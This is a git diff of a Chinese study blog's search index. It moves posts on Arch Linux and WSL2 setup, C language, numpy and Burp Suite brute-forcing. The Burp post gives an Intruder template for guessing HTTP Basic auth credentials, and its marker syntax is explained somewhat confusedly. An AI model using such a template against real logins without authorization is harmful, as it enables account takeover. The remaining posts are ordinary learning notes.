+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --set-default-version 2</span><br></pre></td></tr></table></figure>
+<p>将指定系统版本设置为2:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --set-version arch 2</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Arch</tag>
+      </tags>
   </entry>
   <entry>
     <title>wsl环境ollama运行ai</title>
@@ -331,58 +364,6 @@
       </categories>
       <tags>
         <tag>ollama</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Arch_linux入门</title>
-    <url>/2025/01/19/Arch-linux%E5%85%A5%E9%97%A8/</url>
-    <content><![CDATA[<h3 id="Arch-Linux入门"><a href="#Arch-Linux入门" class="headerlink" title="Arch_Linux入门"></a>Arch_Linux入门</h3><h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><h5 id="bash-profile"><a href="#bash-profile" class="headerlink" title=".bash_profile"></a>.bash_profile</h5><p>1.隐藏文件,有”.”前缀,它是一个 Shell 脚本文件，在用户登录时会被执行，通常用于设置用户的环境变量、别名等个性化配置。<br>2.具体指令:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim ~/.bash_profile</span><br></pre></td></tr></table></figure>
-<p>vim~&#x2F;,该命令是说用vim打开.bash_profile，进行环境变量设置。</p>
-<h5 id="export-EDITOR-’vim’"><a href="#export-EDITOR-’vim’" class="headerlink" title="export EDITOR&#x3D;’vim’"></a>export EDITOR&#x3D;’vim’</h5><p>具体解释:<br>1.export：这是一个 Shell 命令，用于将指定的变量导出为环境变量。环境变量可以在当前 Shell 会话及其子进程中被访问和使用。<br>2.EDITOR：这是一个环境变量名，许多程序和脚本会读取这个环境变量的值，来确定默认使用哪个文本编辑器。例如，一些版本控制系统（如 Git）在需要用户编辑提交信息等文本内容时，就会调用EDITOR环境变量指定的编辑器。<br>&#x3D;’vim’：这部分是给EDITOR环境变量赋值，将其值设置为vim，表示把vim文本编辑器设为默认的文本编辑器。<br>3.总的来说，export EDITOR&#x3D;’vim’这条命令的作用是设置系统的默认文本编辑器为vim 。</p>
-<h5 id="准备非root用户"><a href="#准备非root用户" class="headerlink" title="准备非root用户"></a>准备非root用户</h5><p><strong>useradd命令概述</strong><br>useradd是一个用于在 Linux 系统中创建新用户的命令。它有多个选项来定义新用户的各种属性，如主目录、所属组、默认 Shell 等。<br>各个选项的含义<br><strong>-m选项：</strong><br>含义：这个选项用于创建用户的主目录。如果不使用-m选项，系统可能不会自动为新用户创建主目录。主目录是用户存储个人文件、配置文件等的地方，通常位于&#x2F;home目录下，新用户的主目录名称会与用户名相同，比如为myusername用户创建的主目录可能是&#x2F;home&#x2F;myusername。<br><strong>-G wheel选项：</strong><br>含义：-G用于指定用户所属的附加组（groups）。在这里，wheel是一个组名。在许多 Linux 发行版中，wheel组具有特殊的权限，例如可以通过sudo命令来执行需要管理员权限的任务。将用户添加到wheel组意味着这个新用户（myusername）可能会被赋予一些额外的管理权限相关的功能。不过，具体的权限还需要根据系统的sudo配置等来确定。<br><strong>-s &#x2F;bin&#x2F;bash选项：</strong><br>含义：-s用于指定用户的默认 Shell。Shell 是用户与系统进行交互的接口，在这里将用户myusername的默认 Shell 设置为&#x2F;bin&#x2F;bash。&#x2F;bin&#x2F;bash是一个非常常用的 Shell，它提供了命令补全、历史记录等许多方便的功能，让用户可以更高效地在终端中输入命令和操作系统。<br><strong>myusername参数：</strong><br>含义：这是要创建的新用户的用户名。它是useradd命令的最后一个参数，用于指定新用户的名称，在系统中用于唯一标识这个用户，并且在后续涉及用户相关的操作（如登录、文件权限设置等）中都会用到这个用户名。</p>
-<h5 id="visudo"><a href="#visudo" class="headerlink" title="visudo"></a>visudo</h5><p>visudo是一个用于安全编辑sudoers文件的命令。sudoers文件包含了用户权限配置信息，规定了哪些用户可以以超级用户（root）权限执行哪些命令。使用visudo命令而不是直接编辑sudoers文件（如vim &#x2F;etc&#x2F;sudoers），是因为visudo在编辑前会对文件进行语法检查，防止因错误编辑导致sudo功能无法正常使用或产生安全漏洞。</p>
-<h4 id="初始化系统"><a href="#初始化系统" class="headerlink" title="初始化系统"></a>初始化系统</h4><p>这里是我在arch 中装桌面遇到的情况<br>相关命令:</p>
-<h5 id="添加systemd方式"><a href="#添加systemd方式" class="headerlink" title="添加systemd方式"></a>添加systemd方式</h5><p>配置 WSL 使用 systemd：<br>打开或创建 &#x2F;etc&#x2F;wsl.conf 文件（如果没有这个文件，手动创建）：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nvim /etc/wsl.conf</span><br></pre></td></tr></table></figure>
-<p>添加如下内容启用systemd</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[boot]</span><br><span class="line">systemd=true</span><br></pre></td></tr></table></figure>
-<p>为了使更改生效,在powershell中重启wsl:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure>
-<p>验证 systemd 是否工作:<br>重启 WSL 后，检查 systemd 是否正常运行：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -p 1</span><br></pre></td></tr></table></figure>
-<p>如果一切正常，你应该看到 systemd 作为进程 1 运行。</p>
-<h4 id="有关wsl2的设置"><a href="#有关wsl2的设置" class="headerlink" title="有关wsl2的设置"></a>有关wsl2的设置</h4><h5 id="前置工作"><a href="#前置工作" class="headerlink" title="前置工作"></a>前置工作</h5><p>首先你需要下载软件支持:<br><a href="https://learn.microsoft.com/zh-cn/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package">https://learn.microsoft.com/zh-cn/windows/wsl/install-manual#step-4---download-the-linux-kernel-update-package</a></p>
-<h5 id="重要指令"><a href="#重要指令" class="headerlink" title="重要指令:"></a>重要指令:</h5><p>1.检查wsl中Linux操作系统的wsl版本:<br>powershell中执行:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl -l -v</span><br></pre></td></tr></table></figure>
-<p>2.设定版本:<br>将默认版本设定为2:<br>powershell中执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --set-default-version 2</span><br></pre></td></tr></table></figure>
-<p>将指定系统版本设置为2:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wsl --set-version arch 2</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Arch</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bp爆破中的变量赋值</title>
-    <url>/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/</url>
-    <content><![CDATA[<h3 id="有关密码用户名的提交"><a href="#有关密码用户名的提交" class="headerlink" title="有关密码用户名的提交"></a>有关密码用户名的提交</h3><ul>
-<li>密码提交：<br>比如在web容器内部有输入框让你输入admin和密码,这些数据提交进去是在HTTP请求报文或HTTP请求头中的Authorization结构(用于身份验证和授权信息传递),<br>可以发现admin与password之间使用:隔开,并且注意编码格式。</li>
-<li>变量赋值的提醒<br>变量赋值是用$$分开的,两个$符号之间的字符即为变量的值,比如:</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic §a§:§password§</span><br></pre></td></tr></table></figure>
-<p><strong>注释</strong>:这里把冒号放在a变量里面:</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic $a:$$password$</span><br></pre></td></tr></table></figure>
-<p>也符合HTTP协议的格式。怎么顺眼怎么来</p>
-]]></content>
-      <categories>
-        <category>web安全</category>
-      </categories>
-      <tags>
-        <tag>bp爆破</tag>
       </tags>
   </entry>
   <entry>
@@ -1090,6 +1071,30 @@
       </tags>
   </entry>
   <entry>
+    <title>bp爆破中的变量赋值</title>
+    <url>/2025/01/13/bp%E7%88%86%E7%A0%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F%E8%B5%8B%E5%80%BC/</url>
+    <content><![CDATA[<h3 id="有关密码用户名的提交"><a href="#有关密码用户名的提交" class="headerlink" title="有关密码用户名的提交"></a>有关密码用户名的提交</h3><ul>
+<li>密码提交：<br>比如在web容器内部有输入框让你输入admin和密码,这些数据提交进去是在HTTP请求报文或HTTP请求头中的Authorization结构(用于身份验证和授权信息传递),<br>可以发现admin与password之间使用:隔开,并且注意编码格式。</li>
+<li>变量赋值的提醒<br>变量赋值是用$$分开的,两个$符号之间的字符即为变量的值,比如:</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic §a§:§password§</span><br></pre></td></tr></table></figure>
+<p><strong>注释</strong>:这里把冒号放在a变量里面:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Authorization: Basic $a:$$password$</span><br></pre></td></tr></table></figure>
+<p>也符合HTTP协议的格式。怎么顺眼怎么来</p>
+]]></content>
+      <categories>
+        <category>web安全</category>
+      </categories>
+      <tags>
+        <tag>bp爆破</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>c语言操作题</title>
+    <url>/2025/03/02/c%E8%AF%AD%E8%A8%80%E6%93%8D%E4%BD%9C%E9%A2%98/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
     <title>c语言数值类型与字长的理解</title>
     <url>/2025/01/17/c%E8%AF%AD%E8%A8%80%E6%95%B0%E5%80%BC%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%AD%97%E9%95%BF%E7%9A%84%E7%90%86%E8%A7%A3/</url>
     <content><![CDATA[<h2 id="c语言数据类型"><a href="#c语言数据类型" class="headerlink" title="c语言数据类型"></a>c语言数据类型</h2><h3 id="数据声明与字长"><a href="#数据声明与字长" class="headerlink" title="数据声明与字长"></a>数据声明与字长</h3><p>1.首先字长是计算机可以处理的二进制数的位数,字节是基本单位,一字节等于8位,1位是0或1。</p>
@@ -1257,11 +1262,6 @@
   <entry>
     <title>c语言细节</title>
     <url>/2025/02/08/c%E8%AF%AD%E8%A8%80%E7%BB%86%E8%8A%82/</url>
-    <content><![CDATA[]]></content>
-  </entry>
-  <entry>
-    <title>c语言操作题</title>
-    <url>/2025/03/02/c%E8%AF%AD%E8%A8%80%E6%93%8D%E4%BD%9C%E9%A2%98/</url>
     <content><![CDATA[]]></content>
   </entry>
   <entry>
@@ -1521,7 +1521,7 @@ int main()&#123;
 </ul>
 <h4 id="自定义数据结构里面的指针"><a href="#自定义数据结构里面的指针" class="headerlink" title="自定义数据结构里面的指针"></a>自定义数据结构里面的指针</h4><ul>
 <li>有以下例题:</li>
-<li><style>.hsynoxsoewam{zoom:150%;}</style><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250305135039466.png" class="hsynoxsoewam" alt="image-20250305135039466"></li>
+<li><style>.syrilzjvvpit{zoom:150%;}</style><img src="/2025/03/02/c%E8%AF%AD%E8%A8%80%E9%80%89%E6%8B%A9%E9%A2%98/image-20250305135039466.png" class="syrilzjvvpit" alt="image-20250305135039466"></li>
 <li>要点一:对于<code>struct st a[3] = &#123;5,&amp;a[0], 6,&amp;a[1], 7,&amp;a[2]&#125;, *p;</code>这里由于该结构在初始化的时候，需要两个值来初始化，所以<code>5,&amp;a[0]</code>就构成了数组<code>a</code>的第一个元素<code>a[0]</code>的初始化内容 ，<code>6,&amp;a[1]</code> 、<code>7,&amp;a[2]</code>分别对应<code>a[1]</code>和<code>a[2]</code>的初始化内容。</li>
 <li>要点二:这里对<code>st</code>数据结构数组的值的导入，比如:<code>5,&amp;a[0]</code>,这里第二个值为<code>&amp;a[0]</code>，就是对<code>st *next</code>的赋值，即指向的下一个元素是它本身。</li>
 <li>要点三:指针的数据结构必须和要指向的目标元素的类型相同，才可以进行指向。</li>
@@ -1696,6 +1696,72 @@ int main()&#123;
       </tags>
   </entry>
   <entry>
+    <title>numpy库学习(持续更新)</title>
+    <url>/2025/02/02/numpy%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="numpy库学习-持续更新"><a href="#numpy库学习-持续更新" class="headerlink" title="numpy库学习(持续更新"></a>numpy库学习(持续更新</h1><h2 id="array多维数组概念"><a href="#array多维数组概念" class="headerlink" title="array多维数组概念"></a>array多维数组概念</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>多维数组是一种包含多个维度的数据集合，每个维度可以看作是一个方向，类似于数学中的坐标轴。一维数组可以想象成一条直线上的点的集合，二维数组类似一个平面上的网格，三维数组则像是一个立体空间中的立方体网格，以此类推，可以有更高维度的数组。</p>
+<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
+<li><strong>同质性</strong>：多维数组中的所有元素必须是相同的数据类型，例如 <code>int</code>、<code>float</code> 等。这使得 NumPy 数组在内存中存储更高效，也方便进行统一的数值计算。</li>
+<li><strong>固定大小</strong>：数组创建后，其形状（即各维度的大小）通常是固定的，不像 Python 列表可以动态改变大小。</li>
+</ul>
+<h3 id="创建方式"><a href="#创建方式" class="headerlink" title="创建方式"></a>创建方式</h3><h4 id="使用-np-array-函数"><a href="#使用-np-array-函数" class="headerlink" title="使用 np.array() 函数"></a>使用 <code>np.array()</code> 函数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一维数组</span></span><br><span class="line">one_d_array = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;一维数组:&quot;</span>, one_d_array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建二维数组</span></span><br><span class="line">two_d_array = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;二维数组:\n&quot;</span>, two_d_array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建三维数组</span></span><br><span class="line">three_d_array = np.array([[[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]], [[<span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>]]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;三维数组:\n&quot;</span>, three_d_array)</span><br></pre></td></tr></table></figure>
+
+<h4 id="使用其他函数创建特殊数组"><a href="#使用其他函数创建特殊数组" class="headerlink" title="使用其他函数创建特殊数组"></a>使用其他函数创建特殊数组</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建全零二维数组，形状为 (2, 3)</span></span><br><span class="line">zeros_array = np.zeros((<span class="number">2</span>, <span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;全零二维数组:\n&quot;</span>, zeros_array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建全一三维数组，形状为 (2, 2, 2)</span></span><br><span class="line">ones_array = np.ones((<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;全一三维数组:\n&quot;</span>, ones_array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建指定范围内的一维数组</span></span><br><span class="line">arange_array = np.arange(<span class="number">0</span>, <span class="number">10</span>, <span class="number">2</span>)  <span class="comment"># 从 0 到 10（不包含 10），步长为 2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;一维数组:&quot;</span>, arange_array)</span><br></pre></td></tr></table></figure>
+
+<h3 id="维度与形状"><a href="#维度与形状" class="headerlink" title="维度与形状"></a>维度与形状</h3><ul>
+<li><strong>维度（ndim）</strong>：表示数组的维数，即数组有多少个方向。例如，一维数组的维度是 1，二维数组的维度是 2，以此类推。可以使用数组的 <code>ndim</code> 属性获取维度信息。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">one_d = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">two_d = np.array([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;一维数组的维度:&quot;</span>, one_d.ndim)  <span class="comment"># 输出: 1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;二维数组的维度:&quot;</span>, two_d.ndim)  <span class="comment"># 输出: 2</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>详细概念(有关维度):</p>
+</li>
+<li><p>示例 1：创建一维数组，指定<code>ndmin=1</code>（默认情况，可不写）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">arr1 = np.array(data, ndmin=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(arr1)</span><br><span class="line"><span class="built_in">print</span>(arr1.ndim)  <span class="comment"># 输出数组的维度</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，<code>data</code>本身是一个列表，是一维的数据结构。使用<code>np.array()</code>创建数组时，即使不指定<code>ndmin=1</code>，默认也是创建一维数组。输出结果如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[1 2 3]</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p> 示例 2：创建二维数组，指定<code>ndmin=2</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">arr2 = np.array(data, ndmin=<span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(arr2)</span><br><span class="line"><span class="built_in">print</span>(arr2.ndim)</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>data</code>还是一维的列表，但通过设置<code>ndmin=2</code>，NumPy 会在前面添加一个维度，将其转换为二维数组。输出结果为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[1 2 3]]</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，原本的一维列表被包装成了一个只有一行的二维数组。</p>
+<p> 示例 3：创建三维数组，指定<code>ndmin=3</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">arr3 = np.array(data, ndmin=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(arr3)</span><br><span class="line"><span class="built_in">print</span>(arr3.ndim)</span><br></pre></td></tr></table></figure>
+
+<p>此时<code>data</code>依旧是一维列表，由于<code>ndmin=3</code>，NumPy 会添加两个维度，生成一个三维数组。输出如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[[1 2 3]]]</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
+
+<p>它变成了一个只有一个 “切片” 的三维数组。</p>
+<p>示例 4：已有高维数据，指定<code>ndmin</code>小于其维度</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">data = [[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]]  <span class="comment"># 二维列表</span></span><br><span class="line">arr4 = np.array(data, ndmin=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(arr4)</span><br><span class="line"><span class="built_in">print</span>(arr4.ndim)</span><br></pre></td></tr></table></figure>
+
+<p>这里<code>data</code>是二维列表，虽然指定<code>ndmin=1</code>，但因为原始数据已经是二维，所以<code>arr4</code>还是二维数组，<code>ndmin</code>不会改变高于它指定值的维度。输出为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[1 2]</span><br><span class="line"> [3 4]]</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
+
+<p>通过这些例子可以看出，<code>ndmin</code>参数在需要确保生成的 NumPy 数组具有特定最小维度时非常有用，常用于数据预处理等场景</p>
+</li>
+</ul>
+<ul>
+<li><strong>形状（shape）</strong>：表示数组在每个维度上的大小，是一个元组。例如，二维数组 <code>[[1, 2, 3], [4, 5, 6]]</code> 的形状是 <code>(2, 3)</code>，表示有 2 行 3 列。可以使用数组的 <code>shape</code> 属性获取形状信息。</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">two_d = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;二维数组的形状:&quot;</span>, two_d.shape)  <span class="comment"># 输出: (2, 3)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="索引与切片"><a href="#索引与切片" class="headerlink" title="索引与切片"></a>索引与切片</h3><p>多维数组的索引和切片操作与一维数组类似，但需要考虑多个维度</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">two_d = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问单个元素</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;访问第 1 行第 2 列的元素:&quot;</span>, two_d[<span class="number">0</span>, <span class="number">1</span>])  <span class="comment"># 输出: 2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 切片操作</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;获取第一行的所有元素:&quot;</span>, two_d[<span class="number">0</span>, :])  <span class="comment"># 输出: [1 2 3]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;获取第一列的所有元素:&quot;</span>, two_d[:, <span class="number">0</span>])  <span class="comment"># 输出: [1 4]</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><p>多维数组在数据分析、机器学习、图像处理等领域有广泛应用。例如，在图像处理中，一张彩色图像可以用三维数组表示，其中前两个维度表示图像的高度和宽度，第三个维度表示颜色通道（如红、绿、蓝）。</p>
+]]></content>
+      <categories>
+        <category>python</category>
+      </categories>
+      <tags>
+        <tag>numpy库</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>pandas库学习(持续更新)</title>
     <url>/2025/03/08/pandas%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="python-pandas库学习"><a href="#python-pandas库学习" class="headerlink" title="python pandas库学习"></a>python pandas库学习</h1><h2 id="apply-方法"><a href="#apply-方法" class="headerlink" title="apply() 方法"></a><code>apply()</code> 方法</h2><p><code>pandas</code> 中的 <code>apply</code> 方法是一个非常灵活且强大的工具，可用于对 <code>Series</code> 或 <code>DataFrame</code> 对象中的元素、行或列应用自定义函数。下面为你从多个方面详细介绍其用法。</p>
@@ -1772,83 +1838,6 @@ int main()&#123;
       </tags>
   </entry>
   <entry>
-    <title>numpy库学习(持续更新)</title>
-    <url>/2025/02/02/numpy%E5%BA%93%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="numpy库学习-持续更新"><a href="#numpy库学习-持续更新" class="headerlink" title="numpy库学习(持续更新"></a>numpy库学习(持续更新</h1><h2 id="array多维数组概念"><a href="#array多维数组概念" class="headerlink" title="array多维数组概念"></a>array多维数组概念</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>多维数组是一种包含多个维度的数据集合，每个维度可以看作是一个方向，类似于数学中的坐标轴。一维数组可以想象成一条直线上的点的集合，二维数组类似一个平面上的网格，三维数组则像是一个立体空间中的立方体网格，以此类推，可以有更高维度的数组。</p>
-<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ul>
-<li><strong>同质性</strong>：多维数组中的所有元素必须是相同的数据类型，例如 <code>int</code>、<code>float</code> 等。这使得 NumPy 数组在内存中存储更高效，也方便进行统一的数值计算。</li>
-<li><strong>固定大小</strong>：数组创建后，其形状（即各维度的大小）通常是固定的，不像 Python 列表可以动态改变大小。</li>
-</ul>
-<h3 id="创建方式"><a href="#创建方式" class="headerlink" title="创建方式"></a>创建方式</h3><h4 id="使用-np-array-函数"><a href="#使用-np-array-函数" class="headerlink" title="使用 np.array() 函数"></a>使用 <code>np.array()</code> 函数</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建一维数组</span></span><br><span class="line">one_d_array = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;一维数组:&quot;</span>, one_d_array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建二维数组</span></span><br><span class="line">two_d_array = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;二维数组:\n&quot;</span>, two_d_array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建三维数组</span></span><br><span class="line">three_d_array = np.array([[[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]], [[<span class="number">5</span>, <span class="number">6</span>], [<span class="number">7</span>, <span class="number">8</span>]]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;三维数组:\n&quot;</span>, three_d_array)</span><br></pre></td></tr></table></figure>
-
-<h4 id="使用其他函数创建特殊数组"><a href="#使用其他函数创建特殊数组" class="headerlink" title="使用其他函数创建特殊数组"></a>使用其他函数创建特殊数组</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建全零二维数组，形状为 (2, 3)</span></span><br><span class="line">zeros_array = np.zeros((<span class="number">2</span>, <span class="number">3</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;全零二维数组:\n&quot;</span>, zeros_array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建全一三维数组，形状为 (2, 2, 2)</span></span><br><span class="line">ones_array = np.ones((<span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;全一三维数组:\n&quot;</span>, ones_array)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建指定范围内的一维数组</span></span><br><span class="line">arange_array = np.arange(<span class="number">0</span>, <span class="number">10</span>, <span class="number">2</span>)  <span class="comment"># 从 0 到 10（不包含 10），步长为 2</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;一维数组:&quot;</span>, arange_array)</span><br></pre></td></tr></table></figure>
-
-<h3 id="维度与形状"><a href="#维度与形状" class="headerlink" title="维度与形状"></a>维度与形状</h3><ul>
-<li><strong>维度（ndim）</strong>：表示数组的维数，即数组有多少个方向。例如，一维数组的维度是 1，二维数组的维度是 2，以此类推。可以使用数组的 <code>ndim</code> 属性获取维度信息。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">one_d = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">two_d = np.array([[<span class="number">1</span>, <span class="number">2</span>], [<span class="number">3</span>, <span class="number">4</span>]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;一维数组的维度:&quot;</span>, one_d.ndim)  <span class="comment"># 输出: 1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;二维数组的维度:&quot;</span>, two_d.ndim)  <span class="comment"># 输出: 2</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>详细概念(有关维度):</p>
-</li>
-<li><p>示例 1：创建一维数组，指定<code>ndmin=1</code>（默认情况，可不写）</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">data = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">arr1 = np.array(data, ndmin=<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(arr1)</span><br><span class="line"><span class="built_in">print</span>(arr1.ndim)  <span class="comment"># 输出数组的维度</span></span><br></pre></td></tr></table></figure>
-
-<p>在这个例子中，<code>data</code>本身是一个列表，是一维的数据结构。使用<code>np.array()</code>创建数组时，即使不指定<code>ndmin=1</code>，默认也是创建一维数组。输出结果如下：</p>
